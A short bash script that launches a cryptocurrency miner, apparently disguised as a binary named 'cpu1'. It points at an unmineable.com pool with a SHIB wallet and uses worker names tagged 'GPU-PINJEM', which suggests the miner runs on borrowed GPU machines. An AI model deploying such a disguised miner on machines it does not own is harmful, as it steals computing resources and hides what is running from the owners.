#!/bin/bash

POOL=rx.unmineable.com:3333

WALLET=SHIB:0xb13f91835c32249e1506da1201e937d666652725

WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)

chmod +x cpu1

./cpu1 --algo ETCHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
